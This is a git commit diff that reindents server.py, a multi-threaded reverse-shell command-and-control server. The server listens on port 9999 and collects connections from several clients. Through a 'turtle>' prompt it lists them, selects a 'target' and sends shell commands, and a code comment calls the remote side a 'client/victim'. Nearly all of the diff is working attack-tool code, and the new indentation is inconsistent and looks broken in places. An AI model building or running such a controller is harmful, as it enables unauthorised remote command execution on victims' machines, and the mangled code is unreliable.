e60c83db4b42908a34fde620bc22de6bf5fc985f
Okuhle <blessing.ntloyiya@gmail.com>
2022-08-25 14:55:23 +0200

    Update server.py

--- server.py
+++ server.py
@@ -14,31 +14,31 @@ all_address = []
 # Create a Socket ( connect two computers)
 def create_socket():
  try:
- global host
- global port
- global s
- host = ""
- port = 9999
- s = socket.socket()
+  global host
+  global port
+  global s
+  host = ""
+  port = 9999
+  s = socket.socket()
 
  except socket.error as msg:
- print("Socket creation error: " + str(msg))
+  print("Socket creation error: " + str(msg))
 
 
 # Binding the socket and listening for connections
 def bind_socket():
  try:
- global host
- global port
- global s
- print("Binding the Port: " + str(port))
+  global host
+  global port
+  global s
+  print("Binding the Port: " + str(port))
 
- s.bind((host, port))
- s.listen(5)
+  s.bind((host, port))
+  s.listen(5)
 
  except socket.error as msg:
- print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
- bind_socket()
+  print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
+  bind_socket()
 
 
 # Handling connection from multiple clients and saving to a list
@@ -52,17 +52,17 @@ def accepting_connections():
  del all_address[:]
 
  while True:
- try:
- conn, address = s.accept()
- s.setblocking(1) # prevents timeout
+  try:
+   conn, address = s.accept()
+   s.setblocking(1) # prevents timeout
 
- all_connections.append(conn)
- all_address.append(address)
+   all_connections.append(conn)
+   all_address.append(address)
 
- print("Connection has been established :" + address[0])
+   print("Connection has been established :" + address[0])
 
  except:
- print("Error accepting connections")
+  print("Error accepting connections")
 
 
 # 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
@@ -78,16 +78,16 @@ def accepting_connections():
 def start_turtle():
 
  while True:
- cmd = input('turtle> ')
+  cmd = input('turtle> ')
  if cmd == 'list':
- list_connections()
+  list_connections()
  elif 'select' in cmd:
- conn = get_target(cmd)
+  conn = get_target(cmd)
  if conn is not None:
- send_target_commands(conn)
+  send_target_commands(conn)
 
  else:
- print("Command not recognized")
+  print("Command not recognized")
 
 
 # Display all current active connections with client
@@ -96,79 +96,79 @@ def list_connections():
  results = ''
 
  for i, conn in enumerate(all_connections):
- try:
- conn.send(str.encode(' '))
- conn.recv(20480)
- except:
- del all_connections[i]
- del all_address[i]
- continue
+  try:
+   conn.send(str.encode(' '))
+   conn.recv(20480)
+  except:
+   del all_connections[i]
+   del all_address[i]
+   continue
 
- results = str(i) + " " + str(all_address[i][0]) + " " + str(all_address[i][1]) + "\n"
+  results = str(i) + " " + str(all_address[i][0]) + " " + str(all_address[i][1]) + "\n"
 
  print("----Clients----" + "\n" + results)
 
 
 # Selecting the target
 def get_target(cmd):
- try:
- target = cmd.replace('select ', '') # target = id
- target = int(target)
- conn = all_connections[target]
- print("You are now connected to :" + str(all_address[target][0]))
- print(str(all_address[target][0]) + ">", end="")
- return conn
- # 192.168.0.4> dir
+  try:
+    target = cmd.replace('select ', '') # target = id
+    target = int(target)
+    conn = all_connections[target]
+    print("You are now connected to :" + str(all_address[target][0]))
+    print(str(all_address[target][0]) + ">", end="")
+    return conn
+   # 192.168.0.4> dir
 
- except:
- print("Selection not valid")
- return None
+  except:
+    print("Selection not valid")
+    return None
 
 
 # Send commands to client/victim or a friend
 def send_target_commands(conn):
- while True:
- try:
- cmd = input()
- if cmd == 'quit':
- break
- if len(str.encode(cmd)) > 0:
- conn.send(str.encode(cmd))
- client_response = str(conn.recv(20480), "utf-8")
- print(client_response, end="")
- except:
- print("Error sending commands")
- break
+   while True:
+     try:
+       cmd = input()
+       if cmd == 'quit':
+        break
+       if len(str.encode(cmd)) > 0:
+        conn.send(str.encode(cmd))
+        client_response = str(conn.recv(20480), "utf-8")
+        print(client_response, end="")
+     except:
+       print("Error sending commands")
+       break
 
 
 # Create worker threads
 def create_workers():
  for _ in range(NUMBER_OF_THREADS):
- t = threading.Thread(target=work)
- t.daemon = True
- t.start()
+   t = threading.Thread(target=work)
+   t.daemon = True
+   t.start()
 
 
 # Do next job that is in the queue (handle connections, send commands)
 def work():
- while True:
- x = queue.get()
- if x == 1:
- create_socket()
- bind_socket()
- accepting_connections()
- if x == 2:
- start_turtle()
+  while True:
+    x = queue.get()
+    if x == 1:
+      create_socket()
+      bind_socket()
+      accepting_connections()
+    if x == 2:
+      start_turtle()
 
- queue.task_done()
+      queue.task_done()
 
 
 def create_jobs():
  for x in JOB_NUMBER:
- queue.put(x)
+   queue.put(x)
 
- queue.join()
+  queue.join()
 
 
-create_workers()
-create_jobs()
+ create_workers()
+ create_jobs()
